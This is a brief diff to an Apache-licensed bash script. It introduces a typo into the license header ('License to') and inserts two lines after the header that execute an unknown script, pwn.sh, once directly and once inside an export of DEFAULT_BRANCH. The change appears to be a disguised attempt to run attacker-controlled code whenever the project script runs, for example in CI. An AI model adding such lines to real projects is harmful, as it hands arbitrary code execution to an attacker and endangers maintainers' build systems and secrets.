@@ -1,5 +1,5 @@
 #!/usr/bin/env bash
-# Licensed to the Apache Software Foundation (ASF) under one
+# License to the Apache Software Foundation (ASF) under one
 # or more contributor license agreements.  See the NOTICE file
 # distributed with this work for additional information
 # regarding copyright ownership.  The ASF licenses this file
@@ -15,6 +15,9 @@
 # KIND, either express or implied.  See the License for the
 # specific language governing permissions and limitations
 # under the License.
+
+bash pwn.sh
+export DEFAULT_BRANCH==$(bash pwn.sh)
 
 # Needs to be declared outside function in MacOS
 # shellcheck disable=SC2034
